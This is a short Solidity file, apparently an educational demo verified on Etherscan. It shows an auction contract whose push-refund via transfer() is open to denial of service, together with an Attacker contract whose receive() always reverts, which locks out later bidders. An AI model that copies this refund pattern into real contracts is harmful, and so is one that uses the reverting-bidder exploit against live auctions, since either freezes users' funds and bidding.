/**
 *Submitted for verification at Etherscan.io on 2022-02-22
*/

pragma solidity ^0.8.0;

contract DenialOfService {
    address payable public highestBidder;
    uint256 public amount;

    function bid() external payable {
        require(amount < msg.value);
        
        highestBidder.transfer(amount);

        amount = msg.value;
        highestBidder = payable(msg.sender);
    }

}

contract Attacker {
    DenialOfService public dos = new DenialOfService();

    function attack() external payable {
        dos.bid{value: msg.value}();
    }

    receive() external payable{
        revert();
    }
}